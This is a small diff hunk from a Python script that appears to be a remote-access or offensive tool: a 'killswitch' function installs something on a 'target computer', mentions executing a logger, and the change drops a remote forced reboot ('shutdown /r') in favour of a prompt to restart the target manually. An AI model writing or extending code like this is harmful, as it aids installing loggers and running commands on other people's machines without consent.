@@ -244,8 +244,7 @@ def killswitch(address, password, working, username):
     print("[+] Killswitch installed sucessfully\n")
 
     # execute logger
-    print("\n[*] Restarting target computer...")
-    remote_command(address, password, "shutdown /r")
+    print("\n[!] Restart target computer to execute")
 
 # custom upload
 def upload(address, password, working):
